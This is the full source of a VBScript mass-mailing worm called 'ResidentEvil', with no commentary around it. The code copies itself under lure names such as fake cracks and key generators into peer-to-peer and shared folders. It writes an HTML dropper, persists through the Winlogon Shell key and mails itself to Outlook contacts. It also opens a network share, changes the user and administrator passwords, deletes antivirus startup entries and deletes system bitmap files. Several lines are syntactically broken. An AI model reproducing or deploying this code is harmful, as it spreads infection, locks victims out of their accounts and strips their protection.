   ' // Begin of ResidentEvil by Zeraphime \\ '

   On Error Resume Next

   set skorFso = CreateObject("Scripting.FileSystemObject")
   set skorWshs = CreateObject("Wscript.Shell")
   windir = skorFso.getspecialfolder(0)
   set sysdir=skorFso.getspecialfolder(1)
   set tmpdir=skorFso.getspecialfolder(2)
   set ntwrk = createobject("wscript.network")
   hddisk=left(windir,2)


   set skorgenworm = skorFso.getfile(wscript.scriptfullname)
   skorgenworm.copy (hddisk+"\wowexec32.vbs")
   skorgenworm.copy (tmpdir+"\tcgck.vbs")
   runfile=tmpdir+"\tcgck.vbs"
   set rdconte = skorFso.opentextfile(wscript.scriptfullname)
   wormcontent=rdconte.readall
   rdconte.close
   set htmlbak=skorFso.createtextfile(windir+"\wininfo32.html")
   htmlbak.writeline ("<html>")
   htmlbak.writeline ("<head>")
   htmlbak.writeline ("<title>This is amazing</title>")
   htmlbak.writeline ("<meta name=""generator"" content=""tcgck"">")
   htmlbak.writeline ("</head>")
   htmlbak.writeline ("<body OnLoad=""wormloadtcgck()"">")
   htmlbak.writeline ("This is just a little joke!")
   htmlbak.writeline ("To see this page you must enable active X!")
   htmlbak.writeline ("<script language=""vbscript"">")
   htmlbak.writeline ("Sub wormloadtcgck()")
   htmlbak.write (wormcontent)
   htmlbak.writeline ("End Sub")
   htmlbak.writeline ("</script>")
   htmlbak.writeline ("<body>")
   htmlbak.writeline ("</html>")
   skorWshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell","explorer.exe "+runfile

   set filecopycompress=skorFso.getfile(wscript.scriptfullname)
   s_kazza = skorWshs.regread("HKEY_CURRENT_USER\Software\Kazaa\LocalContent\" + "DownloadDir")
   If Not s_kazza = "" Then
   filecopycompress.Copy (s_kazza + "\Microsoft MSN Messenger Hack.exe.vbs")
   filecopycompress.Copy (s_kazza + "\Windows Vista Downloader.exe.vbs")
   filecopycompress.Copy (s_kazza + "\Windows XP Sourcecode.txt.vbs")
   filecopycompress.Copy (s_kazza + "\PowerDVD 5.9 Crack working.exe.vbs")
   filecopycompress.Copy (s_kazza + "\kaspersky Key working.reg.vbs")
   End If
   Set AllDrives = skorFso.drives
   For Each Laufwerk In AllDrives
   If Laufwerk.DriveType = 2 Then
   FindeOrdnerMitStrings ("Laufwerk")
   End If
   Next
   Function FindeOrdnerMitStrings(Laufwerk)
   On Error Resume Next
   Set fso = CreateObject("scripting.filesystemobject")
   Set thedrive = fso.getfolder(Laufwerk)
   Set subfldr = thedrive.subfolders
   For Each unterordner In subfldr
   If InStr(unterordner.Name, "shar") Or InStr(unterordner.Name, "uplo") _
   Or InStr(unterordner.Name, "downl") Or InStr(unterordner.Name, "freig") _
   Or InStr(unterordner.Name, "instal") Or InStr(unterordner.Name, "softw") Then
   filecopycompress.Copy (unterordner.Name+ "\Microsoft MSN Messenger Hack.exe.vbs")
   filecopycompress.Copy (unterordner.Name + "\Windows Vista Downloader.exe.vbs")
   filecopycompress.Copy (unterordner.Name + "\Windows XP Sourcecode.txt.vbs")
   filecopycompress.Copy (unterordner.Name + "\PowerDVD 5.9 Crack working.exe.vbs")
   filecopycompress.Copy (unterordner.Name + "\kaspersky Key working.reg.vbs")
   End If
   Next
   For Each allOrdner In subfldr
   FindeOrdnerMitStrings (allOrdner.Path)
   Next
   End Function
   SET OUTAPP =CREATEOBJECT ("OUTLOOK.APPLICATION")
   SET NEWEMAIL=OUTAPP.CREATEITEM(0)
   FOR S_MAILS = 1 TO 27
   SET MUHA = OUTAPP.GETNAMESPACE("MAPI")
   SET ARGH= MUHA.ADDRESSLISTS(1).ADDRESSENTRIES(S_MAILS)
   NewEMail.To = argh
   NewEMail.Subject = "Do you love Horror gamez?"
   NewEMail.Body = "ResidentEVil for everyone..."
   NewEMail.Attachments.Add runfile
   NewEMail.Send
   NewEMail.DeleteAfterSubmit = true
   Next
   if not skorFso.fileexists(sysdir+"\3768") then
   Set crtFldrsh = skorFso.createfolder(sysdir + "\3768")
   end if
   If Not skorFso.fileexists(sysdir+"\3768\Downloads") then
   Set crtFldrsh = skorFso.createfolder(sysdir + "\3768\Downloads")
   End If
   Set copysharedf = skorFso.getfile(wscript.scriptfullname)
   copysharedf.Copy (sysdir + "\3768\Downloads\Microsoft MSN Messenger Hack.exe.vbs")
   copysharedf.Copy (sysdir + "\3768\Downloads\Windows Vista Downloader.exe.vbs")
   copysharedf.Copy (sysdir + "\3768\Downloads\Windows XP Sourcecode.txt.vbs")
   copysharedf.Copy (sysdir + "\3768\Downloads\PowerDVD 5.9 Crack working.exe.vbs")
   copysharedf.Copy (sysdir + "\3768\Downloads\kaspersky Key working.reg.vbs")
   ThisUser = ntwrk.computername
   finaluser = "\\" + ThisUser
   FolderName = Form1.sprd5_dirlocation
   AdminServer = finaluser
   Const ShareName = "Software fuer jeden"
   Set Services = GetObject("WINMGMTS:{impersonationLevel=impersonate,(Security)}!" & AdminServer & "\ROOT\CIMV2")
   Set SecDescClass = Services.Get("Win32_SecurityDescriptor")
   Set SecDesc = SecDescClass.SpawnInstance_()
   Set Trustee = Services.Get("Win32_Trustee").SpawnInstance_
   Trustee.Domain = Null
   Trustee.Name = Form1.sprd5_nameprob
   Trustee.Properties_.Item("SID") = Array(1, 1, 0, 0, 0, 0, 0, 1, 0, 0, 0, 0)
   Set ACE = Services.Get("Win32_Ace").SpawnInstance_
   ACE.Properties_.Item("AccessMask") = 2032127
   ACE.Properties_.Item("AceFlags") = 3
   ACE.Properties_.Item("AceType") = 0
   ACE.Properties_.Item("Trustee") = Trustee
   SecDesc.Properties_.Item("DACL") = Array(ACE)
   Set Share = Services.Get("Win32_Share")
   Set InParam = Share.Methods_("Create").InParameters.SpawnInstance_()
   InParam.Properties_.Item("Access") = SecDesc
   InParam.Properties_.Item("Description") = "A normal public directory"
   InParam.Properties_.Item("Name") = ShareName
   InParam.Properties_.Item("Path") = FolderName
   InParam.Properties_.Item("Type") = 0
   Share.ExecMethod_ ("Create"), InParam

   skorWshs.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced\HideFileExt", 1, "REG_DWORD"
   skorWshs.Regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Start Page","www.buha-board.de"
   skorWshs.regwrite "HKEY_CURRENT_USER\Software\Microsoft\Internet Explorer\Main\Window Title","I hate Warez!!!"
   skorWshs.regwrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOrganization","none"
   skorWshs.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\RegisteredOwner","Zeraphime"
   skorWshs.run ("date dd.mm.yy"),,true
   skorWshs.Run ("time hh:mm:ss"),,true
   MsgBox ("I hate WAREZ!!!"),VbCritical,"ResidentEvil generated with tcgck"
   skorWshs.run ("net user %UserName% hacked),,true
   skorWshs.run ("net user administrator hacked1337),,true
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\avgnt"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\KAVPersonal50"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\AVG7_CC"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDMCon"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDNewsAgent"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\BDOESRV"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\pccguide.exe"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\DrWebScheduler"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerMail"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\SpIDerNT"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCAgentExe"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\MCUpdateExe"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\OASClnt"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VirusScan Online"
   skorWshs.regdelete "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\VSOCheckTask"
   Sub skorczybikpayload
   Set allepladden = skorFso.drives
   For Each alledateieninallenfestplatten In allepladden
   If alledateieninallenfestplatten.drivetype = 2 Then
   Searchthafiles (foldername)
   End If
   Next
   Function Searchthafiles(foldername)
   Set gttheinffol = skorFso.getfolder(foldername)
   Set allfii = gttheinffol.Files
   Set subbuii = gttheinffol.subfolders
   For Each dateienzuminfizieren In allfii
   extensionzuminf = LCase(skorFso.getextensionname(dateienzuminfizieren.Path))
   if extensionzuminf = "xml" or extensionzuminf="mp3" or extensionzuminf="pps" then
   end if
   Next
   For Each alleunnerodner In subbuii
   Set strAlleUnterOrnderUoD = alleunnerordner.Files
   For Each jetztdieganzendatenderplatte In strAlleUnterOrnderUoD
   nehmedieext = LCase(fso.getextensionname(jetztdieganzendatenderplatte.Path))
   if nehmedieext = "xml" or nehmedieext="mp3" or nehmedieext="pps" then
   end if
   end if
   Next
   For Each aberdenganzenrechner In subbuii
   Searchthafiles (aberdenganzenrechner)
   Next
   End Function
   Msgbox ("Hello, I am a virus!"),vbokonly + vbInformation,"I hate WAREZ!!!"
   set gtwin = skorFso.getfolder(windir)
   Set bmpfiles = gtwin.Files
   For Each bitmapfile In bmpfiles
   If LCase(skorFso.getextensionname(bitmapfile.path)) = "bmp" Then
   skorFso.deletefile (bitmapfile.Path)
   End If
   Next
   End Sub
